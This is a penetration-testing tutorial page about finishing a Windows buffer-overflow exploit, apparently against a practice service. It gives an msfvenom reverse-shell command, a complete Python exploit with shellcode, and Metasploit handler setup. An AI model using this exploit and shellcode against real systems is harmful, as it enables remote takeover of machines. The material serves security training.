<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Generating Shellcode and gaining shell</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Generating Shellcode and gaining shell</h1><br/><strong>Generate Shellcode</strong><br />Review the chapter <a href="Home--Penetration_Test_Methodology--System_Security_(Windows_&_Linux)--Shellcoding.html">Shellcoding</a> and in particular <a href="Home--Penetration_Test_Methodology--System_Security_(Windows_&_Linux)--Shellcoding--Automate_creation_of_shellcode.html">Automate creation of a shellcode</a><br /><span style="text-decoration:underline;">msfvenom</span> is a combination of the old msfpayload and msfencode, putting both of these tools into a single Framework<br />   ◇ msfpayload → generate the malicious payload<br />   ◇ msfencode → encode the payload in order to avoid bad characters<br />1. List available payloads:<br />	<div class="codebox"><div class="codebox">msfvenom&nbsp;--list&nbsp;payloads</div></div><br />2. Show options for a payload<br />	<div class="codebox"><div class="codebox">msfvenom&nbsp;-p&nbsp;&lt;name_of_the_msfvenom_payload&gt;&nbsp;--list-options</div></div><br /><br /><strong>Shellcode reverse shell</strong><br /><div class="codebox"><div class="codebox">msfvenom&nbsp;--list&nbsp;payloads</div></div><br />In this example we will use windows/shell_reverse_tcp that connect back to attacker and spawn a command shell<br /><div class="codebox"><div class="codebox">msfvenom&nbsp;-p&nbsp;windows/shell_reverse_tcp&nbsp;--list-options</div></div><br />	<a href=""><img src="images/2142-1.png" alt="images/2142-1.png" /></a><br />	<br /><div class="codebox"><div class="codebox">msfvenom&nbsp;-p&nbsp;windows/meterpreter/reverse_tcp&nbsp;LHOST=192.168.1.121&nbsp;LPORT=4444&nbsp;-a&nbsp;x86&nbsp;--platform&nbsp;Windows&nbsp;-b&nbsp;&#39;\x00&#39;&nbsp;EXITFUNC=thread&nbsp;-f&nbsp;c</div></div> <br />	copy it without the semicolon at the end<br />	<a href=""><img src="images/2142-2.png" alt="images/2142-2.png" /></a><br /><br />In the script change the value of <br />• shellcode → with the shellcode generated now<br />• jmp_address → found in the chapter “Find the right module for JMP ESP” at point 3<br />• eip_address_location with the value found in the chapter “Find the Offset”<br />• s.connect with address and port of the service<br />• s.send with the value of the command of the service<br /><div class="codebox"><div class="codebox">#!/usr/bin/python<br />import&nbsp;socket<br />import&nbsp;sys<br />from&nbsp;time&nbsp;import&nbsp;sleep<br /><br />jmp_address&nbsp;=&nbsp;&#39;\xAF\x11\x50\x62&#39;<br />eip_address_location&nbsp;=&nbsp;2003<br />nops&nbsp;=&nbsp;&#39;\x90&#39;&nbsp;*&nbsp;32&nbsp;&nbsp;&nbsp;#if&nbsp;we&nbsp;are&nbsp;limited&nbsp;in&nbsp;space&nbsp;for&nbsp;the&nbsp;payload&nbsp;riduce&nbsp;this&nbsp;padding<br />shellcode&nbsp;=&nbsp;(<br />&quot;\xd9\xc8\xd9\x74\x24\xf4\xbf\xb1\x83\x7e\x56\x5e\x31\xc9\xb1&quot;<br />&quot;\x5e\x31\x7e\x1a\x83\xc6\x04\x03\x7e\x16\xe2\x44\x7f\x96\xd9&quot;<br />&quot;\xa6\x80\x67\x86\x97\x52\x03\xcd\x85\x62\x45\x34\xa2\xd1\x59&quot;<br />&quot;\x3c\xe6\xc1\x6e\xf5\x4c\xcc\xfb\x8b\x78\x21\x03\x5a\xb8\xed&quot;<br />&quot;\xc7\xfc\x44\xec\x1b\xdf\x75\x3f\x6e\x1e\xb2\x89\x04\xcf\x6e&quot;<br />&quot;\x5d\x6c\x5d\x9e\xea\x30\x5e\x9f\x3c\x3f\xde\xe7\x39\x80\xab&quot;<br />&quot;\x5b\x43\xd1\xdf\x2b\x5b\x5a\x87\x8b\x0b\x5d\xeb\x4e\x62\x29&quot;<br />&quot;\x37\x19\x44\x2d\xcc\xad\x2d\xd0\x05\xfc\xf1\x7f\x68\x31\xfc&quot;<br />&quot;\x7e\xac\xf5\x1f\xf5\xc6\x06\x9d\x0e\x1d\x75\x79\x9a\x82\xdd&quot;<br />&quot;\x0a\x3c\x67\xdc\xdf\xdb\xec\xd2\x94\xa8\xab\xf6\x2b\x7c\xc0&quot;<br />&quot;\x02\xa7\x83\x07\x83\xf3\xa7\x83\xc8\xa0\xc6\x92\xb4\x07\xf6&quot;<br />&quot;\xc5\x10\xf7\x52\x8d\xb2\xee\xe3\x6e\x4d\x0f\xbe\xf8\x82\xc2&quot;<br />&quot;\x41\xf9\x8c\x55\x31\xcb\x13\xce\xdd\x67\xdc\xc8\x1a\xf1\xca&quot;<br />&quot;\xea\xf5\xb9\x9a\x14\xf6\xb9\xb3\xd2\xa2\xe9\xab\xf3\xca\x61&quot;<br />&quot;\x2b\xfb\x1e\x1f\x21\x6b\x61\x48\x34\x12\x09\x8b\x36\xf5\x95&quot;<br />&quot;\x02\xd0\xa5\x75\x45\x4c\x06\x26\x25\x3c\xee\x2c\xaa\x63\x0e&quot;<br />&quot;\x4f\x60\x0c\xa5\xa0\xdd\x65\x52\x58\x44\xfd\xc3\xa5\x52\x78&quot;<br />&quot;\xc3\x2e\x57\x7d\x8a\xc6\x12\x6d\xfb\xb0\xdc\x6d\xfc\x54\xdd&quot;<br />&quot;\x07\xf8\xfe\x8a\xbf\x02\x26\xfc\x60\xfc\x0d\x7e\x66\x02\xd0&quot;<br />&quot;\xb7\x1d\x35\x46\xf8\x49\x3a\x86\xf8\x89\x6c\xcc\xf8\xe1\xc8&quot;<br />&quot;\xb4\xaa\x14\x17\x61\xdf\x85\x82\x8a\xb6\x7a\x04\xe3\x34\xa5&quot;<br />&quot;\x62\xac\xc7\x80\xf0\xab\x38\x57\xdf\x13\x51\xa7\x5f\xa4\xa1&quot;<br />&quot;\xcd\x5f\xf4\xc9\x1a\x4f\xfb\x39\xe3\x5a\x54\x52\x6e\x0b\x16&quot;<br />&quot;\xc3\x6f\x06\xf6\x5d\x70\xa5\x23\x6d\x0b\xc6\xd4\x8e\xec\xce&quot;<br />&quot;\xb0\x8e\xed\xee\xc6\xb3\x38\xd7\xbc\xf2\xf9\x6c\xde\xe8\xd7&quot;<br />&quot;\x98\x77\xb5\xb2\x20\x1a\x46\x69\x66\x23\xc5\x9b\x17\xd0\xd5&quot;<br />&quot;\xee\x12\x9c\x51\x03\x6f\x8d\x37\x23\xdc\xae\x1d&quot;)<br /><br />buffer&nbsp;=&nbsp;&#39;A&#39;&nbsp;*&nbsp;eip_address_location&nbsp;+&nbsp;jmp_address&nbsp;+&nbsp;nops&nbsp;+&nbsp;shellcode<br /><br />try:<br />&nbsp;&nbsp;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br />&nbsp;&nbsp;s.settimeout(2)<br />&nbsp;&nbsp;s.connect((&#39;192.168.1.118&#39;,9999))<br />&nbsp;&nbsp;s.recv(1024)<br />&nbsp;&nbsp;<br />&nbsp;&nbsp;print&nbsp;&#39;[*]&nbsp;Sending&nbsp;buffer.&#39;<br />&nbsp;&nbsp;s.send(&#39;TRUN&nbsp;/.:/&#39;&nbsp;+&nbsp;buffer&nbsp;+&nbsp;&#39;\r\n&#39;)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#target&nbsp;the&nbsp;TRUN&nbsp;command<br />&nbsp;&nbsp;s.close()<br />&nbsp;&nbsp;<br />except:<br />&nbsp;&nbsp;print&nbsp;&#39;[*]&nbsp;Could&nbsp;not&nbsp;connect&nbsp;to&nbsp;target,&nbsp;exiting.&#39;<br />&nbsp;&nbsp;sys.exit<span style="color:#000000;font-weight:400">()</span></div></div><br /><br /><br />Set up the Handler<br /><div class="codebox"><div class="codebox">msf&gt;&nbsp;use&nbsp;/exploit/multi/handler<br />msf&gt;&nbsp;set&nbsp;payload&nbsp;windows/meterpreter/reverse_tcp<br />msf&gt;&nbsp;set&nbsp;lhost&nbsp;...<br />msf&gt;&nbsp;set&nbsp;lport&nbsp;...<br />msf&gt;&nbsp;run&nbsp;-j</div></div><br /><br /><br />Run the script from the attacker<br /><div class="codebox"><div class="codebox">./fuzzing.py</div></div><br /><br /><br />Now we should have catch the reverse shell<br />    <a href=""><img src="images/2142-3.png" alt="images/2142-3.png" /></a><br /></div>
</body>
</html>
